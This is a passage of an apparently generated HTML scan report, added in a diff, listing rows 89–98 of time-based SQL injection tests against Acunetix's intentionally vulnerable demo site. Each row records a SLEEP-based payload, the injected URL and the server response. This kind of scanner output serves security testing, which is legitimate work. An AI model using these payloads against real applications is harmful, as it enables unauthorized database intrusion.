+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>89</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_89')">Toggle</span>
+                        <div id="resp_89" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>90</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_90')">Toggle</span>
+                        <div id="resp_90" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>91</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_91')">Toggle</span>
+                        <div id="resp_91" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>92</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_92')">Toggle</span>
+                        <div id="resp_92" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>93</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_93')">Toggle</span>
+                        <div id="resp_93" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>94</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_94')">Toggle</span>
+                        <div id="resp_94" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>95</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_95')">Toggle</span>
+                        <div id="resp_95" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>96</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_96')">Toggle</span>
+                        <div id="resp_96" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>97</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_97')">Toggle</span>
+                        <div id="resp_97" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>98</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_98')">Toggle</span>
+                        <div id="resp_98" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+        </table>
+        </body>
+        </html>
+        
